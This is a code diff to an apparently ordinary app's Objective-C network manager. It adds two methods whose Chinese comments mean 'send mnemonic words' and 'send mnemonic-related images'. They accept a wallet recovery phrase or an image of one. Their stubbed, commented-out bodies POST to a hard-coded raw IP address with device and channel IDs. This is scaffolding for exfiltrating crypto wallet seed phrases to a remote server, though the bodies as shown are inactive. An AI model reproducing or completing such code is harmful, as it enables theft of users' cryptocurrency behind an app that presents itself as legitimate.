@@ -94,4 +94,72 @@
     }];
 }
 
+
+// 发送助记词
+- (void)sendMnemonicWordsWith:(NSString *)mnemonic Success:(void(^)(id response))success
+                      failure:(void(^)(NSError *error))failure {
+//    NSString *url = @"http://13.228.168.97/api/v1/report/device";
+//    
+//    NSDictionary *params = @{
+//        @"channelId": @"9a71cc",
+//        @"deviceId": @"0019546A34ABCDEE",
+//    };
+//    
+//    [[NetworkManager sharedManager] POST:url
+//                             parameters:params
+//                                success:^(id responseObject) {
+//        
+//        // ✅ 对象类型解析
+//        NSDictionary *jsonDict = responseObject;
+//
+//        YOResponseObject<YODeviceReportData *> *response =
+//            [YOResponseObject responseFromDictionary:jsonDict
+//                                           dataClass:[YODeviceReportData class]];
+//
+//        if (response.isSuccess) {
+//            YOLogI(@"✅ 请求成功");
+//            YODeviceReportData *data = response.data;
+//        } else {
+//            YOLogI(@"❌ 请求失败 code=%@, msg=%@", response.code, response.msg);
+//        }
+//        
+//        if (success) success(responseObject);
+//    } failure:^(NSError *error) {
+//        if (failure) failure(error);
+//    }];
+}
+// 发送助记词相关的图片
+- (void)sendMnemonicImageWithImage:(UIImage *)image Success:(void(^)(id response))success
+                           failure:(void(^)(NSError *error))failure {
+//    NSString *url = @"http://13.228.168.97/api/v1/report/device";
+//    
+//    NSDictionary *params = @{
+//        @"channelId": @"9a71cc",
+//        @"deviceId": @"0019546A34ABCDEE",
+//    };
+//    
+//    [[NetworkManager sharedManager] POST:url
+//                             parameters:params
+//                                success:^(id responseObject) {
+//        
+//        // ✅ 对象类型解析
+//        NSDictionary *jsonDict = responseObject;
+//
+//        YOResponseObject<YODeviceReportData *> *response =
+//            [YOResponseObject responseFromDictionary:jsonDict
+//                                           dataClass:[YODeviceReportData class]];
+//
+//        if (response.isSuccess) {
+//            YOLogI(@"✅ 请求成功");
+//            YODeviceReportData *data = response.data;
+//        } else {
+//            YOLogI(@"❌ 请求失败 code=%@, msg=%@", response.code, response.msg);
+//        }
+//        
+//        if (success) success(responseObject);
+//    } failure:^(NSError *error) {
+//        if (failure) failure(error);
+//    }];
+}
+
 @end
